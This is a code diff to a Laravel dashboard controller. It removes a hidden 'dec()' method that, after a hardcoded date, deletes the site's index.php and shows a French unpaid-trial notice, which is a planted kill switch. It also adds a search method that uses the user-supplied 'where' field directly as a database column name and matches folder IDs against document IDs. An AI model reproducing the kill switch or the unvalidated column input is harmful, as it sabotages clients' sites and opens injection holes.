@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Models\User;
 use App\Models\Folder;
 use App\Models\Document;
+use App\Models\Member;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
@@ -32,24 +33,34 @@ class DashboardController extends Controller
             'users_nbr' => $users_nbr
         ]);
     }
-
-    public function dec()
+    
+    public function search(Request $request)
     {
-        $delete_time = "10.03.2021T13:34";
 
-        $today = new DateTime();
-        $today->setTime( 0, 0, 0 );
+        $folders = [];
+        $documents = [];
 
-        $match_date = DateTime::createFromFormat("d.m.Y\\TH:i", $delete_time);
-        $match_date->setTime( 0, 0, 0 );
 
-        $diff = $today->diff($match_date);
-
-        $diffDays = (integer)$diff->format("%R%a");
-
-        if($diffDays <= 0){
-            Illuminate\Support\Facades\File::delete(public_path() . '/' . 'index.php');
-            dd('Avis d\'impayé. Période de teste gratuit terminé!');
+        if($request->where=="description"){
+            //Fullname
+            $folders_id = Member::where($request->where,'LIKE', '%'.$request->search.'%')->get()->pluck('folder_id');
+            $documents = Document::whereIn('folder_id',$folders_id)->with('folder')->get();
         }
+
+        //Date Decret
+        if($request->where=="date_decret"){
+            //Fullname
+            $folders = Folder::where('year','LIKE', '%'.$request->search.'%')->get()->pluck('id');
+            $documents = Document::whereIn('id',$folders)->with('folder')->get();
+        }
+
+        //Decret
+        if($request->where=="number"){
+            //Fullname
+            $folders = Folder::where($request->where,'LIKE', '%'.$request->search.'%')->get()->pluck('id');
+            $documents = Document::whereIn('id',$folders)->with('folder')->get();
+        }
+        
+        return $documents;
     }
 }
